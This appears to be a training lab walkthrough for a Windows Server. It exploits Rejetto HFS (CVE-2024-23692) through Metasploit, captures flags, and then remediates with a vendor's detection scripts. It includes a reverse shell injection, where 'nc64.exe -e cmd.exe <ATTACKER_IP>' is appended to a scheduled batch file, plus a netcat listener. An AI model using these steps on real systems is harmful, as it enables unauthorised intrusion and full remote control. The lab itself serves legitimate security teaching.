# Lab 1: Windows Server – Exploitation & Mitigation

---

## 🔎 Windows Enumeration Phase

**Tool used:** nmap

We begin by performing an initial scan of the target machine to identify exposed services and potential entry points. The following command provides a thorough scan across all ports with enhanced output for analysis:

```bash
nmap -sC -sV -p- <VICTIM_IP> -vvv
```

### Command Breakdown

- **-sC**: Executes Nmap's default scripts, which include common enumeration checks (e.g., service detection, vulnerability probing, etc.).
- **-sV**: Enables version detection to identify the specific versions of services running on open ports.
- **-p-**: Scans all 65,535 TCP ports instead of the default top 1,000.
- **-vvv**: Produces highly verbose output, helpful for understanding the scan's progress and results in detail.

This scan provides a comprehensive overview of the machine's exposed surface and will be the foundation for identifying possible vulnerabilities.

---

## 🔍 Service Enumeration Analysis

We’ll observe several open ports that may indicate potential services:

- Port 3389 suggests that Remote Desktop Protocol (RDP) is enabled.
- Port 445 likely indicates that SMB is running.

However, the most interesting finding for our exploitation path lies on port 80, where an HTTP service is detected.

```text
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 128 HttpFileServer httpd 2.3m
|_http-server-header: HFS 2.3m
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: HFS /
```

At first glance, this may appear harmless — a basic web interface. However, a quick search for "HttpFileServer httpd 2.3m" reveals a known vulnerability: **CVE-2024-23692**, which allows for Remote Code Execution (RCE) via a crafted HTTP request.

![HFS Web Interface](./images/windows/hfs-interface.png)

---

## 💥 Vulnerable Service Exploitation

**Tool used:** metasploit framework

To exploit this vulnerability, we’ll use Metasploit.

Launch the Metasploit console:

```bash
msfconsole
```

Search for the relevant module:

```bash
search Rejetto
```

You should find the module tied to CVE-2024-23692, targeting Rejetto’s vulnerable HFS version.

Use the module:

```bash
use 0
```

Set the RHOSTS exploit variable to the Victim IP:

```bash
set RHOSTS <Victim_IP>
```

Run the exploit:

```bash
run
```

If everything worked, you should now have a meterpreter session inside the Windows Server.

---

## 🧑‍💻 Retrieving the User Flag

With a foothold on the system, the next step is to perform some local enumeration to identify the current user and search for the first flag.

In your Meterpreter session, start a standard shell:

```bash
shell
```

Verify the current user context:

```bash
whoami
```

You should see output like:

```text
vic-ctf-wserver\vAtom
```

This confirms that we have access as a low-privileged user named vAtom.

Navigate to the user’s Desktop directory, where user-level flags are often stored:

```bash
cd C:\Users\vAtom\Desktop
```

Read the contents of the flag file:

```bash
type user_flag.txt
```

✅ You have now recovered the first artifact: the low-privilege user flag.

![User Flag](./images/windows/user-flag.png)

---

## 🧗 Privilege Escalation – Gaining Administrator Access

With initial access as a low-privilege user, our next objective is to escalate privileges in order to retrieve the high-privilege flag located on the Administrator's desktop.

Let’s start by inspecting the contents of the root C:\ directory:

```bash
cd C:\
dir
```

You should see something like this:

```text
Directory of C:\
Program Files
Program Files (x86)
Tasks
Tools
Users
Vulnerabilities
```

Let’s inspect the Tools folder:

```bash
cd C:\Tools
dir
```

You’ll find a binary:

```text
nc64.exe
```

Now let’s check the Tasks folder:

```bash
cd C:\Tasks
dir
```

Expected output:

```text
refresh.bat
refreshed.txt
```

Inspect the batch file:

```bash
type refresh.bat
```

---

## 👑 Retrieving the Administrator Flag

Inject the reverse shell command into the batch file:

```bash
echo C:\Tools\nc64.exe -e cmd.exe <ATTACKER_IP> 4443 >> C:\Tasks\refresh.bat
```

Start a Netcat listener on your attacker machine:

```bash
nc -lnvp 4443
```

Verify your privilege level:

```bash
whoami
```

Retrieve the final artifact:

```bash
cd C:\Users\vAnquish\Desktop
type root_flag.txt
```

✅ You’ve now recovered the high-privilege flag, completing the exploitation of the Windows Server.

![Administrator Flag](./images/windows/admin-flag.png)

---

## 🛡️ Mitigation Phase

### ✅ Step 1: Deploy the vRx Agent

Log in to your Vicarius dashboard.  
Navigate to the Assets section.  
Click on “Add Asset”, then select “Windows Assets”.  
Copy the PowerShell deployment script provided for agent installation.  
On the Windows Server, open a PowerShell terminal with Administrator privileges.  
Paste and execute the copied script.

---

### 🔍 Step 2: Detect the Rejetto HFS Vulnerability

Go to the Scripts Library in your Vicarius dashboard.  
Use the search bar to find scripts related to CVE-2024-23692.  
Select the x_detection script.  
Use the “Run Now” option to immediately execute the script on the Windows Server.

---

### 🛠️ Step 3: Remediate the Vulnerability

From the same search results used in Step 2, locate the x_remediation script for CVE-2024-23692.  
Select the script and click on “Run Now” to execute it immediately on the Windows Server.

---

### 🔍 Step 4: Detect the Misconfigured Scheduled Task

Return to the Scripts Library in the Vicarius dashboard.  
Use the search bar to look for “Scheduled Tasks in Windows”.  
Locate the script titled “Get & List Scheduled Tasks in Windows”.  
Select the script and click “Run Now”.

---

### 🛠️ Step 5: Remediate the Misconfigured Scheduled Task

Search for “Remove Scheduled Task”.  
Locate the script titled “Remove Scheduled Task by Name”.  
Click “Copy As My Script”.  
Update the task name and execute the script.

![Detection Output](./images/windows/detection-output.png)  
![Mitigation Output](./images/windows/mitigation-output.png)

---

